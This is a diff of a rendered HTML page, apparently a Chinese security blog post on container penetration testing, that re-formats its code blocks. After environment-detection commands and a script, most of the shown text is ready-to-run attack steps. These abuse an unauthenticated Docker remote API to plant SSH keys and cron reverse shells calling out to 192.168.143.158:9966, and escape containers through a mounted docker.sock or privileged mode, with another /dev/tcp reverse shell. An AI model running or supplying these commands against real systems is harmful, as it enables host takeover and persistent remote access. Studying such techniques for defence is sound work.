@@ -253,200 +253,20 @@
 <span id="more"></span>
 
 <p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
-<h2 id="0x01-虚拟环境探测"><a href="#0x01-虚拟环境探测" class="headerlink" title="0x01 虚拟环境探测"></a>0x01 虚拟环境探测</h2><h3 id="1-容器环境"><a href="#1-容器环境" class="headerlink" title="1. 容器环境"></a>1. 容器环境</h3><pre><code>1. 检查/.dockerenv文件是否存在
+<h2 id="0x01-虚拟环境探测"><a href="#0x01-虚拟环境探测" class="headerlink" title="0x01 虚拟环境探测"></a>0x01 虚拟环境探测</h2><h3 id="1-容器环境"><a href="#1-容器环境" class="headerlink" title="1. 容器环境"></a>1. 容器环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 检查/.dockerenv文件是否存在</span><br><span class="line"></span><br><span class="line">ls / -al | grep dockerenv</span><br><span class="line"></span><br><span class="line">2. 检查/proc/1/cgroup或/proc/1/cpuset内是否包含&quot;docker&quot;等字符串</span><br><span class="line"></span><br><span class="line">cat /proc/1/cgroup | grep docker</span><br><span class="line"></span><br><span class="line">cat /proc/1/cpuset | grep docker</span><br></pre></td></tr></table></figure>
 
-ls / -al | grep dockerenv
+<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1) 容器环境</span><br><span class="line"></span><br><span class="line">cat /proc/1/cgroup | grep -qi docker \</span><br><span class="line">    &amp;&amp; echo &quot;Docker&quot; \</span><br><span class="line">    || echo &quot;Not Docker&quot;</span><br><span class="line"></span><br><span class="line">[[ -f /.dockerenv ]] &amp;&amp; echo &quot;Docker&quot; || echo &quot;Not Docker&quot;</span><br><span class="line"></span><br><span class="line">cat /proc/1/cgroup | \</span><br><span class="line">    grep -q &#x27;machine-rkt&#x27; \</span><br><span class="line">    &amp;&amp; echo &#x27;rkt&#x27; \</span><br><span class="line">    || echo &#x27;not rkt&#x27;</span><br><span class="line"></span><br><span class="line">2）物理机环境</span><br><span class="line"></span><br><span class="line">systemd-detect-virt  // 输出为none，则说明是物理机</span><br><span class="line"></span><br><span class="line">lscpu | grep -Piq &#x27;Hypervisor vendor&#x27; \</span><br><span class="line">    &amp;&amp; echo &quot;Virtual Machine&quot; \</span><br><span class="line">    || echo &quot;Physical Machine&quot;</span><br><span class="line"></span><br><span class="line">dmidecode -t system // 查看 DMI 信息/sys/firmware/dmi/tables/DMI</span><br><span class="line"></span><br><span class="line">3）虚拟机环境</span><br><span class="line"></span><br><span class="line">systemd-detect-virt  //如果是虚拟机，则会输出虚拟机类型，如 kvm、oracle(virtualbox)、xen 等</span><br><span class="line"></span><br><span class="line">lscpu | grep -i &#x27;Hypervisor vendor&#x27; | cut -d &#x27;:&#x27; -f 2 | tr -d &#x27; &#x27; // 根据 lscpu 命令输出，查看Hypervisor vendor属性值</span><br><span class="line"></span><br><span class="line">dmidecode -t system  // 获取更多的虚拟机信息</span><br></pre></td></tr></table></figure>
 
-2. 检查/proc/1/cgroup或/proc/1/cpuset内是否包含&quot;docker&quot;等字符串
+<h3 id="3-探测脚本"><a href="#3-探测脚本" class="headerlink" title="3. 探测脚本"></a>3. 探测脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">detect_container()</span><br><span class="line">&#123;</span><br><span class="line">    if which systemd-detect-virt &gt;/dev/null 2&gt;&amp;1; then</span><br><span class="line">        TYPE=$(systemd-detect-virt -c)</span><br><span class="line">        if [ &quot;$TYPE&quot; = &quot;none&quot; ]; then</span><br><span class="line">            return 1</span><br><span class="line">        else</span><br><span class="line">            echo &quot;Container: $TYPE&quot;</span><br><span class="line">            return 0</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">    if [ -n &quot;$container&quot; ]; then</span><br><span class="line">        echo &quot;Container: $container&quot;</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    if grep -qi docker /proc/1/cgroup; then</span><br><span class="line">        echo &quot;Container: Docker&quot;</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    if test -f /.dockerenv; then</span><br><span class="line">        echo &quot;Container: Docker&quot;</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    if grep -qi &#x27;machine-rkt&#x27; /proc/1/cgroup; then</span><br><span class="line">        echo &quot;Container: rkt&quot;</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    # Other container type detect here</span><br><span class="line">    return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">detect_physical()</span><br><span class="line">&#123;</span><br><span class="line">    if ! lscpu | grep -qi &#x27;Hypervisor vendor&#x27;; then</span><br><span class="line">        echo &quot;Physical: $(cat /sys/class/dmi/id/product_name)&quot;</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">detect_virtual_machine()</span><br><span class="line">&#123;</span><br><span class="line">    if lscpu | grep -qi &#x27;Hypervisor vendor&#x27;; then</span><br><span class="line">        HYPER_TYPE=$(lscpu | grep -i &quot;Hypervisor vendor&quot; \</span><br><span class="line">            | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/^ *//g&#x27;)</span><br><span class="line">        if dmidecode -t system | grep -qi &#x27;amazon&#x27;; then</span><br><span class="line">            echo &quot;Virtual Machine: AWS/$HYPER_TYPE&quot;</span><br><span class="line">        elif dmidecode -t system | grep -qi &#x27;openstack&#x27;; then</span><br><span class="line">            echo &quot;Virtual Machine: OpenStack/$HYPER_TYPE&quot;</span><br><span class="line">        elif dmidecode -t system | grep -qi &#x27;alibaba&#x27;; then</span><br><span class="line">            echo &quot;Virtual Machine: Aliyun/$HYPER_TYPE&quot;</span><br><span class="line">        else</span><br><span class="line">            Manufacturer=$(dmidecode -t system | grep &#x27;Manufacturer&#x27; \</span><br><span class="line">                | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/^ *//g&#x27;)</span><br><span class="line">            ProductName=$(dmidecode -t system | grep &#x27;Product Name&#x27; \</span><br><span class="line">                | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/^ *//g&#x27;)</span><br><span class="line">            Version=$(dmidecode -t system | grep &#x27;Version&#x27; \</span><br><span class="line">                | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/^ *//g&#x27;)</span><br><span class="line">            echo &quot;Virtual Machine: $Manufacturer $ProductName($Version)/$HYPER_TYPE&quot;</span><br><span class="line">        fi</span><br><span class="line">        return 0</span><br><span class="line">    fi</span><br><span class="line">    return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">detect_virtual_type()</span><br><span class="line">&#123;</span><br><span class="line">    detect_container || detect_physical \</span><br><span class="line">    || detect_virtual_machine || echo &quot;Unknown&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">detect_virtual_type &quot;$@&quot;</span><br></pre></td></tr></table></figure>
 
-cat /proc/1/cgroup | grep docker
-
-cat /proc/1/cpuset | grep docker
-</code></pre>
-<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h3><pre><code>1) 容器环境
-
-cat /proc/1/cgroup | grep -qi docker \
-    &amp;&amp; echo &quot;Docker&quot; \
-    || echo &quot;Not Docker&quot;
-
-[[ -f /.dockerenv ]] &amp;&amp; echo &quot;Docker&quot; || echo &quot;Not Docker&quot;
-
-cat /proc/1/cgroup | \
-    grep -q &#39;machine-rkt&#39; \
-    &amp;&amp; echo &#39;rkt&#39; \
-    || echo &#39;not rkt&#39;
-
-2）物理机环境
-
-systemd-detect-virt  // 输出为none，则说明是物理机
-
-lscpu | grep -Piq &#39;Hypervisor vendor&#39; \
-    &amp;&amp; echo &quot;Virtual Machine&quot; \
-    || echo &quot;Physical Machine&quot;
-
-dmidecode -t system // 查看 DMI 信息/sys/firmware/dmi/tables/DMI
-
-3）虚拟机环境
-
-systemd-detect-virt  //如果是虚拟机，则会输出虚拟机类型，如 kvm、oracle(virtualbox)、xen 等
-
-lscpu | grep -i &#39;Hypervisor vendor&#39; | cut -d &#39;:&#39; -f 2 | tr -d &#39; &#39; // 根据 lscpu 命令输出，查看Hypervisor vendor属性值
-
-dmidecode -t system  // 获取更多的虚拟机信息
-</code></pre>
-<h3 id="3-探测脚本"><a href="#3-探测脚本" class="headerlink" title="3. 探测脚本"></a>3. 探测脚本</h3><pre><code>#!/bin/sh
-
-detect_container()
-&#123;
-    if which systemd-detect-virt &gt;/dev/null 2&gt;&amp;1; then
-        TYPE=$(systemd-detect-virt -c)
-        if [ &quot;$TYPE&quot; = &quot;none&quot; ]; then
-            return 1
-        else
-            echo &quot;Container: $TYPE&quot;
-            return 0
-        fi
-    fi
-    if [ -n &quot;$container&quot; ]; then
-        echo &quot;Container: $container&quot;
-        return 0
-    fi
-    if grep -qi docker /proc/1/cgroup; then
-        echo &quot;Container: Docker&quot;
-        return 0
-    fi
-    if test -f /.dockerenv; then
-        echo &quot;Container: Docker&quot;
-        return 0
-    fi
-    if grep -qi &#39;machine-rkt&#39; /proc/1/cgroup; then
-        echo &quot;Container: rkt&quot;
-        return 0
-    fi
-    # Other container type detect here
-    return 1
-&#125;
-
-detect_physical()
-&#123;
-    if ! lscpu | grep -qi &#39;Hypervisor vendor&#39;; then
-        echo &quot;Physical: $(cat /sys/class/dmi/id/product_name)&quot;
-        return 0
-    fi
-    return 1
-&#125;
-
-detect_virtual_machine()
-&#123;
-    if lscpu | grep -qi &#39;Hypervisor vendor&#39;; then
-        HYPER_TYPE=$(lscpu | grep -i &quot;Hypervisor vendor&quot; \
-            | cut -d &#39;:&#39; -f 2 | sed &#39;s/^ *//g&#39;)
-        if dmidecode -t system | grep -qi &#39;amazon&#39;; then
-            echo &quot;Virtual Machine: AWS/$HYPER_TYPE&quot;
-        elif dmidecode -t system | grep -qi &#39;openstack&#39;; then
-            echo &quot;Virtual Machine: OpenStack/$HYPER_TYPE&quot;
-        elif dmidecode -t system | grep -qi &#39;alibaba&#39;; then
-            echo &quot;Virtual Machine: Aliyun/$HYPER_TYPE&quot;
-        else
-            Manufacturer=$(dmidecode -t system | grep &#39;Manufacturer&#39; \
-                | cut -d &#39;:&#39; -f 2 | sed &#39;s/^ *//g&#39;)
-            ProductName=$(dmidecode -t system | grep &#39;Product Name&#39; \
-                | cut -d &#39;:&#39; -f 2 | sed &#39;s/^ *//g&#39;)
-            Version=$(dmidecode -t system | grep &#39;Version&#39; \
-                | cut -d &#39;:&#39; -f 2 | sed &#39;s/^ *//g&#39;)
-            echo &quot;Virtual Machine: $Manufacturer $ProductName($Version)/$HYPER_TYPE&quot;
-        fi
-        return 0
-    fi
-    return 1
-&#125;
-
-detect_virtual_type()
-&#123;
-    detect_container || detect_physical \
-    || detect_virtual_machine || echo &quot;Unknown&quot;
-&#125;
-
-detect_virtual_type &quot;$@&quot;
-</code></pre>
 <h2 id="0x02-Docker攻击面"><a href="#0x02-Docker攻击面" class="headerlink" title="0x02 Docker攻击面"></a>0x02 Docker攻击面</h2><h3 id="1-docker-daemon-api-unauth"><a href="#1-docker-daemon-api-unauth" class="headerlink" title="1. docker daemon api unauth"></a>1. docker daemon api unauth</h3><p>Docker remote Api未授权访问的攻击原理与Redis未授权类似，是向运行该应用的服务器写文件，从而拿到服务器的权限，docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker</p>
-<pre><code>sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
-</code></pre>
-<pre><code>1) 容器挂载宿主机/root/目录，写ssh公钥
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>
 
-    docker -H tcp://192.168.1.10:2375 run -it -v /root/:/root/ --name alpine_linux image_id sh
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1) 容器挂载宿主机/root/目录，写ssh公钥</span><br><span class="line"></span><br><span class="line">    docker -H tcp://192.168.1.10:2375 run -it -v /root/:/root/ --name alpine_linux image_id sh</span><br><span class="line"></span><br><span class="line">    docker -H tcp://192.168.1.10:2375 start ct_id</span><br><span class="line">        </span><br><span class="line">    docker -H tcp://192.168.1.10:2375 exec -it --user root ct_id sh</span><br><span class="line"></span><br><span class="line">    echo -e &quot;\n\npubkey\n\n&quot; &gt;&gt; /root/.ssh/authorized_keys </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2) 容器挂载宿主机/etc/目录，反弹shell写入/etc/crontab；或者挂载var/spool/cron/目录，写入/var/spool/cron/root文件</span><br><span class="line"></span><br><span class="line">    # 查看宿主机可用镜像</span><br><span class="line">    docker -H tcp://192.168.1.10:2375 images</span><br><span class="line">    # docker -H tcp://192.168.1.10:2375 pull alpine:latest</span><br><span class="line"></span><br><span class="line">    # 选择镜像创建容器挂载本地目录</span><br><span class="line">    docker -H tcp://192.168.1.10:2375 run -it -v /var/spool/cron/:/var/spool/cron/ image_id sh</span><br><span class="line">    # docker -H tcp://192.168.1.10:2375 run -it -v /etc/:/etc/ image_id sh</span><br><span class="line">    # docker run -it -v /etc/:/etc/ -v /root/:/root/ -v /var/spool/cron/:/var/spool/cron/ image_id  //挂载多个路径</span><br><span class="line"></span><br><span class="line">    # 启动刚刚创建的容器并连接</span><br><span class="line">    docker -H tcp://192.168.1.10:2375 start ct_id</span><br><span class="line">    docker -H tcp://192.168.1.10:2375 exec -it --user root ct_id sh</span><br><span class="line"></span><br><span class="line">    # 执行shell反弹命令</span><br><span class="line">    echo &#x27;* * * * * sh -i &gt;&amp; /dev/tcp/192.168.143.158/9966 0&gt;&amp;1&#x27; &gt;&gt; /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">    echo -e &quot;\n\n* * * * * root sh -i&gt;&amp;/dev/tcp/192.168.143.158/9966 0&gt;&amp;1\n\n&quot; &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
 
-    docker -H tcp://192.168.1.10:2375 start ct_id
-        
-    docker -H tcp://192.168.1.10:2375 exec -it --user root ct_id sh
-
-    echo -e &quot;\n\npubkey\n\n&quot; &gt;&gt; /root/.ssh/authorized_keys 
-
-
-2) 容器挂载宿主机/etc/目录，反弹shell写入/etc/crontab；或者挂载var/spool/cron/目录，写入/var/spool/cron/root文件
-
-    # 查看宿主机可用镜像
-    docker -H tcp://192.168.1.10:2375 images
-    # docker -H tcp://192.168.1.10:2375 pull alpine:latest
-
-    # 选择镜像创建容器挂载本地目录
-    docker -H tcp://192.168.1.10:2375 run -it -v /var/spool/cron/:/var/spool/cron/ image_id sh
-    # docker -H tcp://192.168.1.10:2375 run -it -v /etc/:/etc/ image_id sh
-    # docker run -it -v /etc/:/etc/ -v /root/:/root/ -v /var/spool/cron/:/var/spool/cron/ image_id  //挂载多个路径
-
-    # 启动刚刚创建的容器并连接
-    docker -H tcp://192.168.1.10:2375 start ct_id
-    docker -H tcp://192.168.1.10:2375 exec -it --user root ct_id sh
-
-    # 执行shell反弹命令
-    echo &#39;* * * * * sh -i &gt;&amp; /dev/tcp/192.168.143.158/9966 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root
-
-    echo -e &quot;\n\n* * * * * root sh -i&gt;&amp;/dev/tcp/192.168.143.158/9966 0&gt;&amp;1\n\n&quot; &gt;&gt; /etc/crontab
-</code></pre>
 <h3 id="2-容器逃逸漏洞"><a href="#2-容器逃逸漏洞" class="headerlink" title="2. 容器逃逸漏洞"></a>2. 容器逃逸漏洞</h3><p>Docker逃逸主要由三类原因引起，配置不当、软件设计缺陷及内核漏洞</p>
-<h4 id="a-配置不当导致逃逸"><a href="#a-配置不当导致逃逸" class="headerlink" title="a. 配置不当导致逃逸"></a>a. 配置不当导致逃逸</h4><pre><code>1) docker remote api未授权访问
+<h4 id="a-配置不当导致逃逸"><a href="#a-配置不当导致逃逸" class="headerlink" title="a. 配置不当导致逃逸"></a>a. 配置不当导致逃逸</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1) docker remote api未授权访问</span><br><span class="line"></span><br><span class="line">2) docker.sock挂载到容器内部</span><br><span class="line"></span><br><span class="line">在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker.sock文件挂载到容器中</span><br><span class="line"></span><br><span class="line">docker run --rm -it \</span><br><span class="line">  -v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">  -v /usr/bin/docker:/usr/bin/docker \</span><br><span class="line">  alpine \</span><br><span class="line">  /bin/bash</span><br><span class="line"></span><br><span class="line">find / -name docker.sock  # 在容器中查找docker.sock</span><br><span class="line"></span><br><span class="line">docker -H unix:///var/run/docker.sock info  # 在容器查看宿主机docker信息</span><br><span class="line"></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it -v /:/test alpine /bin/bash  # 运行新容器并挂载宿主机根路径</span><br><span class="line"></span><br><span class="line">在新容器的/test 目录下，可以访问到宿主机的全部资源，接下来可通过写文件获取shell</span><br><span class="line"></span><br><span class="line">3）docker特权模式启动</span><br><span class="line"></span><br><span class="line">使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限；Docker 通过Linux namespace实现六项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器较大的权限，从而打破了资源隔离的界限</span><br><span class="line"></span><br><span class="line">docker run --rm -it </span><br><span class="line">    --privileged </span><br><span class="line">    -v /:/soft </span><br><span class="line">    --cap-add=SYS_ADMIN     # 启动时，允许执行mount特权操作，需获得资源挂载进行利用</span><br><span class="line">    --net=host              # 启动时，绕过Network Namespace</span><br><span class="line">    --pid=host              # 启动时，绕过PID Namespace</span><br><span class="line">    --ipc=host              # 启动时，绕过IPC Namespace</span><br><span class="line">    alpine </span><br><span class="line">    /bin/bash</span><br><span class="line"></span><br><span class="line">sudo docker run -itd --privileged alpine:latest /bin/bash  # 通过特权模式启动一个容器</span><br><span class="line"></span><br><span class="line">fdisk -l               # 在容器内查看磁盘文件</span><br><span class="line"></span><br><span class="line">mkdir /test            # 将/dev/sda1 挂载到新建目录</span><br><span class="line">mount /dev/sda3 /test</span><br><span class="line"></span><br><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/2233 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root  # 将计划任务写入到宿主机</span><br></pre></td></tr></table></figure>
 
-2) docker.sock挂载到容器内部
-
-在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker.sock文件挂载到容器中
-
-docker run --rm -it \
-  -v /var/run/docker.sock:/var/run/docker.sock \
-  -v /usr/bin/docker:/usr/bin/docker \
-  alpine \
-  /bin/bash
-
-find / -name docker.sock  # 在容器中查找docker.sock
-
-docker -H unix:///var/run/docker.sock info  # 在容器查看宿主机docker信息
-
-docker -H unix:///var/run/docker.sock run -it -v /:/test alpine /bin/bash  # 运行新容器并挂载宿主机根路径
-
-在新容器的/test 目录下，可以访问到宿主机的全部资源，接下来可通过写文件获取shell
-
-3）docker特权模式启动
-
-使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限；Docker 通过Linux namespace实现六项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器较大的权限，从而打破了资源隔离的界限
-
-docker run --rm -it 
-    --privileged 
-    -v /:/soft 
-    --cap-add=SYS_ADMIN     # 启动时，允许执行mount特权操作，需获得资源挂载进行利用
-    --net=host              # 启动时，绕过Network Namespace
-    --pid=host              # 启动时，绕过PID Namespace
-    --ipc=host              # 启动时，绕过IPC Namespace
-    alpine 
-    /bin/bash
-
-sudo docker run -itd --privileged alpine:latest /bin/bash  # 通过特权模式启动一个容器
-
-fdisk -l               # 在容器内查看磁盘文件
-
-mkdir /test            # 将/dev/sda1 挂载到新建目录
-mount /dev/sda3 /test
-
-echo &#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/2233 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root  # 将计划任务写入到宿主机
-</code></pre>
 <h4 id="b-软件设计缺陷导致逃逸"><a href="#b-软件设计缺陷导致逃逸" class="headerlink" title="b. 软件设计缺陷导致逃逸"></a>b. 软件设计缺陷导致逃逸</h4><p><strong>Shocker 攻击</strong></p>
 <p>漏洞原理：Shocker攻击的关键是执行了系统调用open_by_handle_at函数，调用open_by_handle_at函数需要具备CAP_DAC_READ_SEARCH能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制CAP_DAC_READ_SEARCH能力，因而引发了容器逃逸的风险</p>
 <p>影响版本： Docker版本&lt; 1.0</p>
